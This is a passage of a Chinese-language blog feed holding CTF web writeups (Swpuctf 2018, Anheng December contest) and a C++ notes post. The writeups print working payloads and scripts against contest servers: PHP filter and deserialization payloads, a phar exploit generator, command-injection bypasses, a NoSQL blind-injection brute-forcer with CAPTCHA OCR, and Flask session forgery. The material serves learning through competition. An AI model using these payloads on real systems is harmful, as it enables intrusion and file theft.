class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现file_get_contents，由此想到php封装协议，请求方式时post可以使用php://input来获取原始请求的数据。<br>构造<br><code>http://39.106.148.174:8666?php://input</code></p><p>协议构造admin.</p><p>利用php://filter可以读取任意文件。php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。<br>参考<a href="https://www.leavesongs.com/penetration/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/penetration/php-filter-magic.html</a><br>这里学习了一些用法<br><code>readfile(&quot;php://filter/read=convert.base64-encode/resource=php://input&quot;);</code></p><p>我们进行读取class.php文件可以构造<br><code>http://39.106.148.174:8666?php://input&amp;php://filter/convert.base64-encode/resource=class.php</code><br>读取到的内容base64解码之后获得<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"_toString was called!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><code>function _toString()</code>魔术方法，构造参数获得read类file变量。考察点php反序列化，<br>构造 <code>?user=php://input&amp;file=class.php&amp;pass=O:4:&quot;Read&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64_encode/resource=flag.php&quot;;}</code><br><img src="https://i.imgur.com/7FPw9Go.png" alt=""></p><p>base64解码得到flag;</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h1&gt;&lt;p&gt;查看响应头发现tips:4he9e.txt&lt;br&gt;&lt;img src=&quot;https://i.imgur.com/Nee638w.png&quot; al
      
    
    </summary>
    
      <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
    
    
      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Swpuctf复现</title>
    <link href="http://yoursite.com/2018/12/22/Swpuctf_writeup/"/>
    <id>http://yoursite.com/2018/12/22/Swpuctf_writeup/</id>
    <published>2018-12-21T16:00:00.000Z</published>
    <updated>2018-12-23T06:07:41.732Z</updated>
    
    <content type="html"><![CDATA[<h1 id="用优惠码买个X"><a href="#用优惠码买个X" class="headerlink" title="用优惠码买个X"></a>用优惠码买个X</h1><ol><li>单引号里面的双引号中的变量不会解析！ </li><li>string substr ( string $string , int $start [, int $length ] )<br>如果提供了负数的 length，那么 string 末尾处的 length 个字符将会被省略</li><li>@错误抑制符</li><li>rand() 和 mt_rand() 产生的最大随机数都是2147483647，为2^31-1,</li></ol><ol><li>注册登陆给了一个15位优惠码，提交验证码发现需要24位，学习到了预测种子，然后产生对应的24位优惠码。<br>御剑扫描发现后台<a href="http://www.zip，下载发现有生成优惠码源码和第二个页面验证代码。通过源码反推随机数，然后利用php_mt_seed进行种子预测。" target="_blank" rel="noopener">www.zip，下载发现有生成优惠码源码和第二个页面验证代码。通过源码反推随机数，然后利用php_mt_seed进行种子预测。</a></li></ol><p>(注意点：前8位对应$str_rand中的位置，便是随机数的结果，后7位对应的是反过来的位置)</p><p>工具参考<br><a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">https://www.openwall.com/php_mt_seed/</a><br>首先利用脚本反推<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2=<span class="string">'KQtJTKbw58giTby'</span></span><br><span class="line"><span class="comment">#seed = 0x06bb6862 = 112945250 (PHP 7.1.0+)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">if</span> i&lt;=len(str2)/<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">            <span class="keyword">if</span> str2[i]==str1[j]:</span><br><span class="line">                res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">            <span class="keyword">if</span> str2[i]==str1[j]:</span><br><span class="line">                res+=str(len(str1)-j)+<span class="string">' '</span>+str(len(str1)-j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure></p><p>php_mt_seed 这个工具把产生的随机数作为参数,去爆破种子;<br><img src="https://i.imgur.com/dSaccZa.png" alt=""><br>然后修改soure.php中len为24，手动播种mt_srand()<br>mt_srand(569202727);<br>生成24位优惠码<code>KQtJTKbw52UShbyY3WlmmZgs</code><br>提交后通过验证</p><ol><li>Bypass绕过，/im m设置后“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后。只要匹配一个就会返回正确。</li></ol><p>首先是一个ip地址的匹配。用<code>%0a</code>绕过。</p><ol><li>第二层不能出现<code>flag \ cat echo</code>等字符。<br>需要 <code>c/at /fl\a\g</code>。进行绕过</li></ol><p>最后payload: <code>ip=1.0.0.1%0ac\at /f\la\g</code></p><h1 id="Injection"><a href="#Injection" class="headerlink" title="Injection"></a>Injection</h1><p>f12查看源码发现info.php,访问之后查看<br><img src="https://i.imgur.com/9PTqHcS.png" alt=""><br>mongo，由此可以想到mongo注入，然后抓包，进行测试<br><img src="https://i.imgur.com/5zceEat.png" alt=""><br>可以绕过，由此是Nosql注入。通过盲注进行测试，<br>最终payload<br><code>http://123.206.213.66:45678/check.php?username[$ne]=admin&amp;password[$regex]=^skmun&amp;vertify=kzd3</code></p><p>参考别人Writeup,用pytesseract可以进行验证码识别。学到姿势。<br>附上脚本。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">password = <span class="string">''</span></span><br><span class="line">string_list = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string_list:</span><br><span class="line">        res = s.get(<span class="string">'http://123.206.213.66:45678/vertify.php'</span>)</span><br><span class="line">        image_name = os.path.join(os.path.dirname(__file__),<span class="string">'yzm.jpg'</span>)</span><br><span class="line">        <span class="keyword">with</span> open(image_name, <span class="string">'wb'</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(res.content)</span><br><span class="line">        image = Image.open(image_name)</span><br><span class="line">        code = pytesseract.image_to_string(image)</span><br><span class="line">        res = s.get(<span class="string">'http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^'</span>+password + j +<span class="string">'&amp;vertify='</span>+code)</span><br><span class="line">        <span class="keyword">while</span> (<span class="string">'CAPTCHA'</span> <span class="keyword">in</span> res.content):</span><br><span class="line">            res = s.get(<span class="string">'http://123.206.213.66:45678/vertify.php'</span>)</span><br><span class="line">            image_name = os.path.join(os.path.dirname(__file__),<span class="string">'yzm.jpg'</span>)</span><br><span class="line">            <span class="keyword">with</span> open(image_name, <span class="string">'wb'</span>) <span class="keyword">as</span> file:</span><br><span class="line">                file.write(res.content)</span><br><span class="line">            image = Image.open(image_name)</span><br><span class="line">            code = pytesseract.image_to_string(image)</span><br><span class="line">            res = s.get(<span class="string">'http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^'</span>+password + j +<span class="string">'&amp;vertify='</span>+code)</span><br><span class="line">        <span class="keyword">print</span> password+j,res.content</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Nice!But it is not the real passwd'</span> <span class="keyword">in</span> res.content:</span><br><span class="line">            password += j</span><br><span class="line">            <span class="keyword">print</span> password</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'username or password incorrect'</span> <span class="keyword">in</span> res.content:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">print</span> password</span><br></pre></td></tr></table></figure></p><h1 id="皇家线上赌场"><a href="#皇家线上赌场" class="headerlink" title="皇家线上赌场"></a>皇家线上赌场</h1><p>绝对路径:绝对路径又分为本地绝对路径和网络绝对路径.<br>相对路径 :相对于当前文件的路径 ../../</p><p>os.path.join()。 注：第一个绝对路径之前的参数将被忽略</p><p>cat /proc/pid/maps 查看进程内存映射</p><p>利用特性构造文件包含读取到web 路径。<br>pwd 当前工作目录<br>cwd 所在的目录的绝对路径.进程当前工作目录的符号链接</p><p>view-source:<a href="http://107.167.188.241/static?file=/proc/self/cwd/app/views.py" target="_blank" rel="noopener">http://107.167.188.241/static?file=/proc/self/cwd/app/views.py</a></p><p>伪造session<br>username修改为admin.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span><span class="params">(object)</span>:</span></span><br><span class="line">    secret_key = <span class="string">'9f516783b42730b7888008dd5c15fe66'</span></span><br><span class="line"></span><br><span class="line">s = SecureCookieSessionInterface().get_signing_serializer(App())</span><br><span class="line">u = s.loads(<span class="string">'.eJwVzDsSwyAMRdG9vNqFCP4Am8kIWRROImYAVxnvPc6tTnW_yPxmE0VydDdB6mkD6a_eynPUlxoSyJVZwqaZY1hJRXj1cwyu7PvDUy6ZluiZBBPOrs34cy9xcK-G6wctLh7_.XB7-2Q.d8W10pqlUI57tZthRyxwUddoIuQ'</span>)</span><br><span class="line">u[<span class="string">'username'</span>] = <span class="string">'admin'</span></span><br><span class="line">u[<span class="string">'balance'</span>]=<span class="number">100000000</span></span><br><span class="line">print(s.dumps(u))</span><br></pre></td></tr></table></figure><p>点击admin用burp抓包发现username字段。<br>python的format函数漏洞。通过format将flag读取<br>构造继承链条<br><code>field=__class__.save.__globals__[db].__class__.__init__.__globals__[current_app].before_request.__globals__[g].flag</code></p><p>读取flag;</p><p><img src="https://i.imgur.com/udAy0yV.png" alt=""></p><h1 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h1><p>网站有两个功能，一个upload_file.php上传，一个查看文件file.php。<br>通过file.php查看所有源码</p><p>查看提示flag在f1ag.php中。<br>于是学习了一波phar反序列化漏洞。<br>具体参考<a href="http://n3k0sec.top/2018/12/18/swpuctf-wp/#SimplePHP" target="_blank" rel="noopener">http://n3k0sec.top/2018/12/18/swpuctf-wp/#SimplePHP</a><br>生成phar文件</p><p>看别人脚本exp构造<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $test;</span><br><span class="line"><span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $source;</span><br><span class="line"><span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line"><span class="keyword">public</span> $params = <span class="keyword">array</span>(<span class="string">'source'</span> =&gt; <span class="string">'var/www/html/f1ag.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"c1e4r.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"c1e4r.phar"</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">    $p1 = <span class="keyword">new</span> C1e4r();</span><br><span class="line">$p2 = <span class="keyword">new</span> Show();</span><br><span class="line">$p2-&gt;str = <span class="keyword">array</span>(<span class="string">'str'</span>=&gt;<span class="keyword">new</span> Test());</span><br><span class="line">$p1-&gt;str = $p2;</span><br><span class="line"></span><br><span class="line">    $phar-&gt;setMetadata($p1); </span><br><span class="line">var_dump($phar-&gt;getMetadata());</span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"c1e4r"</span>); </span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>形成pop链，上传之后在function中看到$filename = md5($_FILES[“file”][“name”].$_SERVER[“REMOTE_ADDR”]).”.jpg”;,进行md5加密访问<code>file.php?file=phar://upload/文件名</code>,base64解密得到flag;</p><p>Remote_addr 表示代理ip地址。</p><hr><p>#Misc </p><h1 id="唯有低头，才能出头"><a href="#唯有低头，才能出头" class="headerlink" title="唯有低头，才能出头"></a>唯有低头，才能出头</h1><p><code>99 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33</code></p><p>99-l 9-o 以此类推</p><h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>看到一般flag{}   ，Winhex前四位是宽，后四位是高，修改高度，02 ff;</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;用优惠码买个X&quot;&gt;&lt;a href=&quot;#用优惠码买个X&quot; class=&quot;headerlink&quot; title=&quot;用优惠码买个X&quot;&gt;&lt;/a&gt;用优惠码买个X&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;单引号里面的双引号中的变量不会解析！ &lt;/li&gt;
&lt;li&gt;string substr (
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>安恒杯12月月赛</title>
    <link href="http://yoursite.com/2018/12/22/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9BWriteup/"/>
    <id>http://yoursite.com/2018/12/22/安恒月赛Writeup/</id>
    <published>2018-12-21T16:00:00.000Z</published>
    <updated>2018-12-23T04:11:26.347Z</updated>
    
    <content type="html"><![CDATA[<h1 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($filename))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($filename); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $data = $_GET[<span class="string">'data'</span>];</span><br><span class="line">    preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$data,$matches);</span><br><span class="line">    <span class="keyword">if</span>(count($matches))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Hacker!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $good = unserialize($data);</span><br><span class="line">        <span class="keyword">echo</span> $good;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>题目源码。</p><p>主要利用点反序列化漏洞。 当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</p><p><code>preg_match(&#39;/[oc]:\d+:/i&#39;,$data,$matches)</code>，需要先绕过这个匹配。参考博文<a href="https://blog.spoock.com/2016/11/03/php-wakeup/" target="_blank" rel="noopener">https://blog.spoock.com/2016/11/03/php-wakeup/</a>将</p><p>故绕过payload<code>O:4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code><br>将<code>O:4修改为O:+4</code></p><p>直接传值的话会，服务器接收到会把加号认为空格。</p><p>将+进行URL编码<br>最终payload:<code>O:%2b4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p><h1 id="easyweb2"><a href="#easyweb2" class="headerlink" title="easyweb2"></a>easyweb2</h1><p>在请求包中发现</p><p>user=dXNlcg解码发现是user，将admin用base64编码然后修改Cookie.</p><p>跳转到<img src="https://i.imgur.com/obFUyGt.png" alt=""></p><p>执行cmd命令</p><p>cmd=ls存在回显。尝试读文件在config.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_exec</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">$black_str = <span class="string">"/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\?|@|\+| )/i"</span>;</span><br><span class="line">$str = preg_replace($black_str, <span class="string">""</span>,$str);</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>看到了检测机制。过滤了空格但是$/未过滤。<br>然后通过$IFS(bash中的内部域分隔符)进行bypass</p><p><img src="https://i.imgur.com/0KANGV4.png" alt=""><br>cmd=ls$IFS/  发现ffLAG_404<br>读取  <code>cmd=cat$IFS/ffLAG_404</code>读取flag;<br><img src="https://i.imgur.com/X7CZD1e.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;easy&quot;&gt;&lt;a href=&quot;#easy&quot; class=&quot;headerlink&quot; title=&quot;easy&quot;&gt;&lt;/a&gt;easy&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;
      
    
    </summary>
    
      <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>C++学习</title>
    <link href="http://yoursite.com/2018/12/11/C++2/"/>
    <id>http://yoursite.com/2018/12/11/C++2/</id>
    <published>2018-12-10T16:00:00.000Z</published>
    <updated>2018-12-23T04:13:52.098Z</updated>
    
    <content type="html"><![CDATA[<h1 id="类模板与模板类"><a href="#类模板与模板类" class="headerlink" title="类模板与模板类"></a>类模板与模板类</h1><p>类模板：用户为类定义模式，参数取任意类型。（类型不确定）<br>模板类：类模板实例化产物</p><h1 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h1><p>char str[] 一个字符数组,例如‘a’,’b’<br>char <em>str[] 一个数组，类型是char</em><br>char* 指向字符串，是一个字符串数组，可以是”abc””123”</p><h1 id="swap函数"><a href="#swap函数" class="headerlink" title="swap函数"></a>swap函数</h1><pre><code>void swap(int *x, int *y){int temp=*x;*x=*y;*y=temp;}</code></pre><p>或者</p><pre><code>void swap(int&amp; a, int&amp; b){    int swap = a;    a = b;    b = swap;}</code></pre><p>应该交换地址而非传递形参的值进行交换</p><h1 id="double不以科学技术输出"><a href="#double不以科学技术输出" class="headerlink" title="double不以科学技术输出"></a>double不以科学技术输出</h1><p>库<br>#include<iomanip></iomanip></p><p>cout&lt;&lt;fixed&lt;&lt;setprecision()&lt;&lt;ans&lt;&lt;endl;</p><p>round()四舍五入函数。</p><p>#define PI 定义宏，简单的文本替换。</p><p><code>getchar()   //接受一個字符，需包含“#include&lt;string&gt;”ch=getchar();</code></p><p><code>gets()        // 接受一個字符串，可以接收空格并輸出，需包含“#include&lt;string&gt;”gets(m);</code></p><p>getline()     // 接受一個字符串，可以接收空格并输出<br>getline(cin,str);</p><p>cin.getline()   // 接受一個字符串，可以接收空格并输出<br>cin.getline(m,5);   </p><p> cin.get(字符变量名)可以用来接收字符        </p><h1 id="sort函数"><a href="#sort函数" class="headerlink" title="sort函数"></a>sort函数</h1><p>（数组起始地址，数组结束地址，排序方法默认从小到大）</p><h1 id="结构体学习"><a href="#结构体学习" class="headerlink" title="结构体学习"></a>结构体学习</h1><p>在声明类型的同时定义变量</p><pre><code>#include&lt;iostream&gt;using namespace std;int main(){    struct Student{      //声明一个结构体类型Student         int num;         //声明一个整形变量num         char name[20];   //声明一个字符型数组name         char sex;        //声明一个字符型变量sex         int age;         //声明一个整形变量age         float score;     //声明一个单精度型变量         char addr[30];   //声明一个字符型数组addr    }student1,student2;//声明变量student1和student2   cout&lt;&lt;sizeof(Student)&lt;&lt;endl;   cout&lt;&lt;sizeof(student1)&lt;&lt;endl;   cout&lt;&lt;sizeof(student2)&lt;&lt;endl;        return 0;}</code></pre><p>创建动态struct数组<br>Student * array=new Student[n];</p><ul><li><code>struct struct name * struct_array=new struct_name[struct_array_len]</code></li><li>输入struct数组元素值<br><code>scanf(&quot;%d&quot;,&amp;struct_array[i].struct_member)</code></li><li>排序<br><code>sort(struct_array,struct_array+struct_array_len,compare)</code></li><li>释放<br><code>delete []struct_array</code></li></ul><h1 id="读取大数据"><a href="#读取大数据" class="headerlink" title="读取大数据"></a>读取大数据</h1><p>std::ios::sync_with_stdio(false)可取消cin和stdcin同步；节省开销<br>可以将cin和scanf的效率相匹敌；</p><h1 id="memset"><a href="#memset" class="headerlink" title="memset"></a>memset</h1><p>void <em>memset(void </em>s, int ch, size_t n);<br>将s所指向的某一块内存中的前n个字节的内容全部设置为ch指定的ASCII值。这个函数通常为新申请的内存做初始化工作。其返回值为s。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;类模板与模板类&quot;&gt;&lt;a href=&quot;#类模板与模板类&quot; class=&quot;headerlink&quot; title=&quot;类模板与模板类&quot;&gt;&lt;/a&gt;类模板与模板类&lt;/h1&gt;&lt;p&gt;类模板：用户为类定义模式，参数取任意类型。（类型不确定）&lt;br&gt;模板类：类模板实例化产物&lt;/p&gt;
&lt;
      
    
    </summary>
    
      <category term="code" scheme="http://yoursite.com/categories/code/"/>
    
    
      <category term="program" scheme="http://yoursite.com/tags/program/"/>
    
  </entry>
  
  <entry>
    <title>实验吧Writeup</title>
    <link href="http://yoursite.com/2018/12/04/%E5%AE%9E%E9%AA%8C%E5%90%A7/"/>
    <id>http://yoursite.com/2018/12/04/实验吧/</id>
    <published>2018-12-03T16:00:00.000Z</published>
    <updated>2018-12-23T04:29:24.079Z</updated>
    
